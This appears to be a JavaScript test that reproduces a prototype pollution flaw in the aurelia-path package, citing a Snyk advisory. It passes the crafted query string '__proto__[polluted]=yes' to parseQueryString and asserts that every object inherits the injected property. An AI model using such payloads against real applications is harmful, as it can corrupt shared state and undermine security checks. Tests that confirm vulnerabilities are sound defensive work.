//https://security.snyk.io/vuln/SNYK-JS-AURELIAPATH-1292346
test("prototype pollution in aurelia-path", () => {
  const ap = require("aurelia-path");

  expect({}.polluted).toBe(undefined);

  ap.parseQueryString("__proto__[polluted]=yes");

  expect({}.polluted).toBe("yes");
});
